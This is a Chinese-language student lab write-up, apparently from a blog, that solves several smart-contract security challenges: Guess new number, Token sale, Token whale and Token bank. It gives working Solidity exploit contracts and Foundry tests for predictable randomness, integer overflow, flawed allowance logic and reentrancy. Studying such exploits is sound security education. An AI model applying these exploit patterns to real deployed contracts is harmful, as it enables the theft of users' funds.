+<p>本题的answer也是由上一block的hash值与时间戳生成的，只不过和上一题生成answer的时机不同。Guess random number是在调用guess函数之前就已经生成好answer，而Guess new number是在guess函数中生成。</p>
+<p>但对于攻击者而言，不管是哪种情况，当前block的number以及时间戳都是已知的，因此模仿answer生成即可猜出随机数。</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Write your exploit codes below</span></span><br><span class="line"></span><br><span class="line">contract ExploitContract &#123;</span><br><span class="line"></span><br><span class="line">  GuessNewNumber <span class="keyword">public</span> guessNewNumber;</span><br><span class="line"></span><br><span class="line">  uint8 <span class="keyword">public</span> answer;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(uint8)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    answer = <span class="built_in">uint8</span>(<span class="built_in">uint256</span>(<span class="built_in">keccak256</span>(abi.<span class="built_in">encodePacked</span>(<span class="built_in">blockhash</span>(block.number - <span class="number">1</span>), block.timestamp))));</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> answer;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052221636.jpg"
+                      alt="img"
+                > </p>
+<h5 id="4-Token-sale"><a href="#4-Token-sale" class="headerlink" title="4. Token sale"></a>4. <strong>Token sale</strong></h5><blockquote>
+<p>该代币合约允许您以1个代币（token）兑换1个以太币（ether）的固定汇率买卖代币。合约开始时的余额为1个以太币。看看你能否从中赚取一些利润吧。</p>
+<p>目标：窃取部分代币。</p>
+<p>（附上添加的解决方案代码、思路解释，以及解决方案运行成功的截图）</p>
+</blockquote>
+<p>要求tokenSale的以太币余额少于1 ether，也就是说我们要把它买出来（即sell token）</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">isComplete</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(<span class="type">bool</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="built_in">address</span>(<span class="keyword">this</span>).balance &lt; <span class="number">1</span> ether;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>首先初始情况下攻击协议是没有token的（或者说我们没有足够的余额将足够的wei换出），想令tokenSale的以太币余额少于1 ether就需要我们从某处“偷”token。</p>
+<p>攻击突破口：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function buy(uint256 numTokens) public payable returns (uint256) &#123;</span><br><span class="line"></span><br><span class="line">​    uint256 total = 0;</span><br><span class="line"></span><br><span class="line">​    unchecked &#123;</span><br><span class="line"></span><br><span class="line">​      total += numTokens * PRICE_PER_TOKEN;// 这里并不检查溢出，total = (numTokens * PRICE_PER_TOKEN) mod 2²⁵⁶</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    require(msg.value == total);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​    balanceOf[msg.sender] += numTokens;</span><br><span class="line"></span><br><span class="line">​    return (total);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>当numTokens * PRICE_PER_TOKE超过uint256最大值时发生溢出，这意味着我们可以构造合适的数，使得溢出后截断的total等于value，实现用更少的value（以太币，单位为wei）买更多的token。还需要注意的是，构造的token数、wei数不能超过uint256 最大值，否则无法编译通过。</p>
+<p>构造原理：首先明确一点，此时交易的ether不是整数，也就是说我们要用wei作为单位。为了防止value（单位wei）溢出，我们计算total发生溢出时对应numToken的最小值，然后计算total的真实取值，即应付款的value（单位wei）。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n1 = 2**256</span><br><span class="line"></span><br><span class="line">n2 = 10**18</span><br><span class="line"></span><br><span class="line">numTokens = (n1 - 1) // n2 + 1	# total发生溢出时的最小值，但溢出的值一定要在攻击方的余额内（1、2、3，至少留1个在账户）</span><br><span class="line"></span><br><span class="line">value = numTokens * n2 - n1 # 溢出 = 计算得到的total，如果total等于msg.value，交易就能够成功</span><br><span class="line"></span><br><span class="line">print(&quot;numTokens =&quot;,numTokens)</span><br><span class="line"></span><br><span class="line">print(&quot;value =&quot;,value)</span><br><span class="line"></span><br><span class="line">\# numTokens = 115792089237316195423570985008687907853269984665640564039458</span><br><span class="line"></span><br><span class="line">\# ether = 415992086870360064</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>然后就可以卖掉“偷”到的一个token，实现攻击。值得注意的是，需要在攻击合约和测试中补充攻击函数Exploiter。</p>
+<p>补充代码如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// Write your exploit contract below</span><br><span class="line"></span><br><span class="line">contract ExploitContract &#123;</span><br><span class="line"></span><br><span class="line">  TokenSale public tokenSale;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  constructor(TokenSale _tokenSale) &#123;</span><br><span class="line"></span><br><span class="line">​    tokenSale = _tokenSale;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  // write your exploit functions below</span><br><span class="line"></span><br><span class="line">  function Exploiter() external &#123;</span><br><span class="line"></span><br><span class="line">​    uint256 numTokens = 115792089237316195423570985008687907853269984665640564039458;</span><br><span class="line"></span><br><span class="line">​    uint256 value = 415992086870360064; </span><br><span class="line"></span><br><span class="line">​    tokenSale.buy&#123;value: value&#125;(numTokens);</span><br><span class="line"></span><br><span class="line">​    tokenSale.sell(1);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">测试文件：</span><br><span class="line"></span><br><span class="line">// Use the instance of tokenSale and exploitContract</span><br><span class="line"></span><br><span class="line">  function testIncrement() public &#123;</span><br><span class="line"></span><br><span class="line">​    // Put your solution here</span><br><span class="line"></span><br><span class="line">​    exploitContract.Exploiter();</span><br><span class="line"></span><br><span class="line">​    _checkSolved();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217880.jpg"
+                      alt="img"
+                > </p>
+<h5 id="5-Token-whale"><a href="#5-Token-whale" class="headerlink" title="5. Token whale"></a>5. <strong>Token whale</strong></h5><blockquote>
+<p>这款兼容ERC-20的代币难以获取，其总供应量固定为1,000个代币，且初始阶段所有代币均归你所有。试找到一种方法积累至少1,000,000枚代币以完成此挑战。</p>
+<p>目标：积累至少 1,000,000 个代币。</p>
+<p>（附上添加的解决方案代码、思路解释，以及解决方案运行成功的截图）</p>
+</blockquote>
+<p>攻击突破口在transferFrom函数，检查from的余额但扣除其授权者的余额，逻辑有误，且_transfer函数可溢出。（这里的逻辑一开始没有细看，直接默认是正常人逻辑，后来测试的时候一整个蒙圈，重新读了代码才明白过来）</p>
+<p>首先利用transfer函数将player的余额全部转出，然后利用transferFrom函数的混乱检查（检查代理余额，扣除调用者的余额），请求让达成协议的用户进行transferFrom，此时扣款发生溢出，实现目标。</p>
+<p>本题需要格外注意的是，msg.sender地址是指谁？因为大部分情况是player，所以我的代码写在了testExploit函数中，需要其他sender的场景使用vm.startPrank和vm.stopPrank即可。</p>
+<p>代码分析如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">function isComplete() public view returns (bool) &#123;</span><br><span class="line"></span><br><span class="line">​    return balanceOf[player] &gt;= 1000000;	// 要求player的余额大于1000000</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line"></span><br><span class="line">​    unchecked &#123;</span><br><span class="line"></span><br><span class="line">​      balanceOf[msg.sender] -= value;	// 溢出</span><br><span class="line"></span><br><span class="line">​      balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  function transfer(address to, uint256 value) public &#123;</span><br><span class="line"></span><br><span class="line">​    require(balanceOf[msg.sender] &gt;= value);   // sender：余额足够</span><br><span class="line"></span><br><span class="line">​    require(balanceOf[to] + value &gt;= balanceOf[to]);   // to：余额不会溢出</span><br><span class="line"></span><br><span class="line">​    _transfer(to, value);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  event Approval(</span><br><span class="line"></span><br><span class="line">​    address indexed owner,</span><br><span class="line"></span><br><span class="line">​    address indexed spender,</span><br><span class="line"></span><br><span class="line">​    uint256 value</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint256 value) public &#123;  // sender授权spender可以花费owner的余额</span><br><span class="line"></span><br><span class="line">​    allowance[msg.sender][spender] = value;</span><br><span class="line"></span><br><span class="line">​    emit Approval(msg.sender, spender, value);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line"></span><br><span class="line">​    require(balanceOf[from] &gt;= value);	// 这里检查from的余额，但后面扣除的是授权者的余额，一整个逻辑混乱</span><br><span class="line"></span><br><span class="line">​    require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">​    require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">​    allowance[from][msg.sender] -= value;</span><br><span class="line"></span><br><span class="line">​    _transfer(to, value);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>攻击代码如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// Use the instance tokenWhale and exploitContract</span><br><span class="line"></span><br><span class="line">  // Use vm.startPrank and vm.stopPrank to change between msg.sender</span><br><span class="line"></span><br><span class="line">  function testExploit() public &#123;</span><br><span class="line"></span><br><span class="line">​    // Put your solution here</span><br><span class="line"></span><br><span class="line">​    address addr = address(this);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​    tokenWhale.transfer(Alice, 1000);</span><br><span class="line"></span><br><span class="line">​    tokenWhale.approve(Alice, type(uint256).max);</span><br><span class="line"></span><br><span class="line">​    vm.startPrank(Alice);</span><br><span class="line"></span><br><span class="line">​    tokenWhale.approve(addr, type(uint256).max);</span><br><span class="line"></span><br><span class="line">​    vm.stopPrank();</span><br><span class="line"></span><br><span class="line">​    tokenWhale.transferFrom(Alice, Bob, 10);  </span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    _checkSolved();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>运行截图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052223447.jpg"
+                      alt="img"
+                > </p>
+<h5 id="6-Token-bank"><a href="#6-Token-bank" class="headerlink" title="6. Token bank"></a>6. <strong>Token bank</strong></h5><blockquote>
+<p>一个代币银行允许任何人通过将代币转入银行来存入代币，然后在以后提取这些代币。它使用ERC-223来接受传入的代币。该银行部署了一个名为“Simple ERC223 Token”的代币，并将代币的一半分配给我，另一半分配给你。如果你能清空银行，你就赢得了这个挑战。</p>
+<p>目标：清空银行。</p>
+<p>（附上添加的解决方案代码、思路解释，以及解决方案运行成功的截图）</p>
+</blockquote>
+<p>攻击突破口为withdraw函数，逻辑是先转账，再扣款。如果这两个操作之间的transfer函数触发tokenFallback函数（此时可以再次调用withdraw以清空银行），然后再回到withdraw函数进行扣款，这就实现了“付一笔款买两份东西”。但注意，想要实现这一点，还需要之前用户的余额不小于银行的余额，否则仍是有心无力。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 amount) public &#123;</span><br><span class="line"></span><br><span class="line">​    // emit Test1(msg.sender, balanceOf[msg.sender]);</span><br><span class="line"></span><br><span class="line">​    require(balanceOf[msg.sender] &gt;= amount);  // 先转账，再扣余额</span><br><span class="line"></span><br><span class="line">​    require(token.transfer(msg.sender, amount));</span><br><span class="line"></span><br><span class="line">​    unchecked &#123;</span><br><span class="line"></span><br><span class="line">​      balanceOf[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>具体而言，先将player的余额全部取出，通过transferfrom函数将token转移给攻击合约。调用攻击合约的exploit函数进行攻击，首先将攻击合约的token存入银行，获得余额，调用withdraw函数→transfer函数→tokenFallback函数，利用attacking标识当前一次的withdraw是否嵌套调用，然后根据余额状况再一次调用withdraw，也就是说<em><strong>主函数中的一次withdraw可以取出两倍的value</strong></em>，实现清空。</p>
+<p>值得注意的是，本题目设定应为：</p>
+<ol>
+<li><p>不可动用test账户余额</p>
+</li>
+<li><p>不可利用token地址直接调用tokenFallback函数，否则会扰乱整个交易秩序（具体而言就是，用户向银行存款，但银行账户余额不增加，如果是这样的话，直接多找几个账户转款、存款、取款就能把银行取垮了）</p>
+</li>
+<li><p>协议的基本设定不可随意变化（比如，把Test变为ITokenReceiver，此时在test中就能将test用户的余额取出，题目就没有意义了）</p>
+</li>
+</ol>
+<p>详细代码如下：</p>
+<ol>
+<li>TokenBank.sol</li>
+</ol>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">contract TokenBankAttacker is ITokenReceiver &#123;</span><br><span class="line"></span><br><span class="line">  TokenBankChallenge <span class="keyword">public</span> challenge;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="built_in">constructor</span>(address challengeAddress) &#123;</span><br><span class="line"></span><br><span class="line">​    challenge = <span class="built_in">TokenBankChallenge</span>(challengeAddress);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write your exploit contract below</span></span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> attacking ;   <span class="comment">// 标记是否已经进行攻击，防止迭代</span></span><br><span class="line"></span><br><span class="line">  SimpleERC223Token <span class="keyword">public</span> token;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">exploit</span><span class="params">()</span> external </span>&#123;</span><br><span class="line"></span><br><span class="line">​    token = challenge.<span class="built_in">token</span>();</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 将攻击协议手中的token存入银行（tokenFallback函数）</span></span><br><span class="line"></span><br><span class="line">​    token.<span class="built_in">transfer</span>(<span class="built_in">address</span>(challenge), <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span> );</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 攻击协议取出余额，触发连环调用</span></span><br><span class="line"></span><br><span class="line">​    challenge.<span class="built_in">withdraw</span>(<span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span> <span class="number">-1</span>); <span class="comment">// 取出 1000000 * 10**18 - 2</span></span><br><span class="line"></span><br><span class="line">​    attacking = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">​    challenge.<span class="built_in">withdraw</span>(<span class="number">1</span>);  <span class="comment">// 取出2</span></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 共取出1000000 * 10**18，清空</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">tokenFallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">​    address,  </span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">​    uint256,  </span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">​    bytes memory </span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">  )</span> external <span class="keyword">override</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="built_in">require</span>(msg.sender == <span class="built_in">address</span>(token), <span class="string">&quot;Invalid sender&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>(!attacking)&#123;</span><br><span class="line"></span><br><span class="line">​      attacking = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">​      uint256 bankBalance = token.<span class="built_in">balanceOf</span>(<span class="built_in">address</span>(challenge));  <span class="comment">// 取出银行中所有的余额</span></span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span> (bankBalance &gt; <span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span>) &#123;<span class="comment">// 针对攻击协议的第一次withdraw，防止超出余额；第二次两个都是1，不会超出</span></span><br><span class="line"></span><br><span class="line">​        challenge.<span class="built_in">withdraw</span>(<span class="number">500000</span> * <span class="number">10</span>**<span class="number">18</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">​      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">​        challenge.<span class="built_in">withdraw</span>(bankBalance);</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<ol start="2">
+<li>TokenBank.sol</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">contract TankBankTest is Test &#123;</span><br><span class="line"></span><br><span class="line">  TokenBankChallenge public tokenBankChallenge;</span><br><span class="line"></span><br><span class="line">  TokenBankAttacker public tokenBankAttacker;</span><br><span class="line"></span><br><span class="line">  address player = address(1234);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  function setUp() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function testExploit() public &#123;</span><br><span class="line"></span><br><span class="line">​    tokenBankChallenge = new TokenBankChallenge(player);   </span><br><span class="line"></span><br><span class="line">​    tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​    // Put your solution here</span><br><span class="line"></span><br><span class="line">​    SimpleERC223Token token = tokenBankChallenge.token();</span><br><span class="line"></span><br><span class="line">​    vm.startPrank(player);  </span><br><span class="line"></span><br><span class="line">​    tokenBankChallenge.withdraw(500000 * 10**18);  // 先把player的余额取出，剩余一半</span><br><span class="line"></span><br><span class="line">​    token.approve(player, type(uint256).max);    // 授权</span><br><span class="line"></span><br><span class="line">​    // 把player手里的token给tokenBankAttacker</span><br><span class="line"></span><br><span class="line">​    token.transferFrom(player, address(0x2e234DAe75C793f67A35089C9d99245E1C58470b), 500000 * 10**18);   </span><br><span class="line"></span><br><span class="line">​    vm.stopPrank();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">​    tokenBankAttacker.exploit();   // 进行攻击</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​    _checkSolved();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202511052217399.jpg"
+                      alt="img"
+                > </p>
+<h2 id="三．实验总结"><a href="#三．实验总结" class="headerlink" title="三．实验总结"></a>三．<strong>实验总结</strong></h2><p>在本次Smart Contract实验中，我学习并分析了多个智能合约漏洞与攻击场景，涵盖了碰撞、链上伪随机数推导、token定价漏洞、整数溢出、重入漏洞等典型问题。</p>
+<ul>
+<li><p>通过前两个任务，我知道了链上数据具有公开性，不能用作保密用途，也不能作为随机数源</p>
+</li>
+<li><p>Token Whale与Token Sale两题让我理解了整数溢出在定价机制中的利用方式</p>
+</li>
+<li><p>在Token Bank中学习了重入攻击，结合tokenFallback函数的回调机制，利用操作步骤顺序错误完成攻击，体现了逻辑漏洞带来的实际风险</p>
+</li>
+</ul>
+<p>整个过程中，我不仅尝试了Foundry框架的使用，也加深了对智能合约安全性的系统性理解。</p>
